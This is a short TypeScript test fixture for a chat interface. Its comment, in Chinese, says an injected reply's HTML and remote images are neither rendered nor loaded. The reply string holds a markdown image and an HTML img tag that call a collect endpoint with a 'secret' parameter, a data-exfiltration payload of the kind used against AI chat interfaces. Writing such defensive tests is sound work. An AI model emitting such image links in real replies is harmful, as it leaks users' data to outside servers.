// 回复里夹着注入的 HTML 与远程图片:都不渲染、不加载。
import { mountChat } from "./harness";

const REPLY = [
  "查到了。",
  "",
  "![leak](http://127.0.0.1:9/collect?d=secret)",
  "",
  '<img src="http://127.0.0.1:9/collect?d=html" alt="x"> <b>粗体标签</b>',
].join("\n");

mountChat({ delay: 5, events: () => [{ type: "delta" as const, text: REPLY }, { type: "done" as const, full: "" }] });
